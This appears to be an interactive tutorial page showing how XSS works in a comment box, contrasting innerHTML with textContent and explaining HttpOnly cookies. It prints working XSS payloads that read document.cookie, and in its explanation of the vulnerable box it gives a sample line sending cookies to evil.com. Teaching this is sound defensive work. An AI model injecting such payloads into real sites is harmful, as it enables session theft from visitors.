🐛 XSS in 2 minutes

Pretend this page is a comments section. You (the "attacker") type a comment; the site displays it. The only difference between the two boxes below is how the site renders your text.

The payload — paste one of these as your "comment"

These only pop a local alert() showing this page's document.cookie — harmless, but it proves a script ran and could read your cookies.

<img src=x onerror="alert('XSS! I can read: ' + document.cookie)">

<script>alert('XSS! cookie = ' + document.cookie)</script>   <!-- (innerHTML won't run bare <script>; the img trick does) -->

Vulnerable — the site drops your text straight into the page as HTML

— click "Render the UNSAFE way" —

Code the site ran: el.innerHTML = userComment. Your <img onerror> executed. On a real site, instead of alert() the payload would do fetch('https://evil.com/steal?c=' + document.cookie) and every visitor's session id would land in the attacker's logs.

Safe — the site treats your text as text

— click "Render the SAFE way" —

Code the site ran: el.textContent = userComment. The exact same payload shows up as literal characters and does nothing. (React/Django/Jinja escape by default — this is why.)

🔑 Where HttpOnly comes in

Click "Toggle a fake session cookie", then run the UNSAFE render again:

  • Without HttpOnly (a normal document.cookie value): the payload's document.cookie includes the session id → the XSS steals it.
  • With HttpOnly: the browser hides that cookie from JavaScript, so document.cookie comes back without it → the same XSS gets nothing useful. (You can't set a real HttpOnly cookie from JS — that's the whole point — so this demo just simulates the two outcomes in the note below.)

Two lessons: (1) the real fix is to never render user input as HTML — escape it (the SAFE box). (2) HttpOnly is defence-in-depth: even if an XSS slips through, it can't read the session cookie.
